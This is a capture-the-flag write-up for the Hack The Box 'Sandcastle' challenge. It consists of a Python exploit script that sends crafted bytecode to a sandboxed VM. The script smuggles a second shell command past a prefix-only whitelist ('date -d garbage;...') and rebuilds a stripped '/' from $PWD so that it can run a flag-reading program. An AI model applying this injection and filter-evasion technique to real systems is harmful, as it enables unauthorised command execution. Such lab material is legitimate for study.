# Sandcastle HTB Insane Challenge Writeup
```python
#!/usr/bin/env python3
"""Exploit the sandcastle bytecode VM and print the flag."""

import re
import socket
import sys

HOST = "154.57.164.75"
PORT = 31540


def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise RuntimeError("connection closed before prompt")
        data += chunk
    return data


def build_program():
    # The VM's EXEC whitelist checks only the first four bytes ("date").
    # Literal '.' and '/' are stripped, so derive '/' from $PWD without
    # putting either forbidden character in the command.
    command = b"date -d garbage;${PWD%${PWD#?}}flag-reader"

    # 8: copy an inline literal into VM memory
    # 9: copy it to shared channel 1 (the EXEC input channel)
    # 12,5: invoke EXEC
    # 11,2,0: copy EXEC output channel 2 to output channel 0
    # 12,0,255: write 255 bytes from output channel 0 to stdout
    # 19: harmless trailing VM instruction; the connection is closed once
    #     the flag is observed.
    return (
        bytes((8, len(command)))
        + command
        + bytes((9, len(command), 1, 12, 5, 0, 11, 2, 0, 12, 0, 255, 19))
    )


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    program = build_program()

    with socket.create_connection((host, port), timeout=8) as sock:
        sock.settimeout(2)
        recv_until(sock, b"Enter size of program")

        # scanf("%ud") consumes the decimal size and a literal 'd'.  Do not
        # send a newline here: the following raw read must start at bytecode.
        sock.sendall(str(len(program)).encode() + b"d")
        recv_until(sock, b"Enter program:")
        sock.sendall(program)

        output = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            output += chunk
            match = re.search(rb"HTB\{[^}\r\n]+\}", output)
            if match:
                print(match.group().decode())
                return

        print(output.decode("utf-8", "replace"), end="")
        raise RuntimeError("flag pattern not found")


if __name__ == "__main__":
    main()
```